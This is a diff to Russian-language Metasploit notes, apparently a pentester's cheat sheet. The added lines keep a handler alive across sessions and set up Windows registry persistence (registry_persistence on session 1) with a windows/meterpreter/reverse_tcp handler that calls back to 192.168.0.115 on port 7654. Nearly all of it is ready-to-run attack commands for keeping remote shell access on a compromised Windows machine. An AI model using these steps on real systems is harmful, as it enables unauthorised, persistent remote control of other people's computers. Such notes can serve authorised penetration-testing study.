@@ -15,6 +15,11 @@
 
 `getprivs` посмотреть привилегии
 
+Сочетание команд, позволяет хендлеру продолжать работать после создания сессии.
+
+`set ExitOnSession False` 
+`run -jz`
+
 # Инициализация базы данных для сохранение информации
 
 1. Запустить postgresql.
@@ -43,7 +48,9 @@
 
 # Persistence 
 
-## Service 
+## Windows
+
+*Service*
 Target setting:
 
 `search persistence`
@@ -65,6 +72,30 @@ Handler setting:
 `set lhost 192.168.0.115`
 
 `set lport 4245`
+
+`exploit`
+
+*Autoruns*
+
+Target setting:
+
+`use exploit/windows/local/registry_persistence`
+
+`set session 1`
+
+`set lport 7654`
+
+`exploit`
+
+Handler setting:
+
+`use exploit/multi/handler`
+
+`set payload windows/meterpreter/reverse_tcp`
+
+`set lhost 192.168.0.115`
+
+`set lport 7654`
 
 `exploit`
 
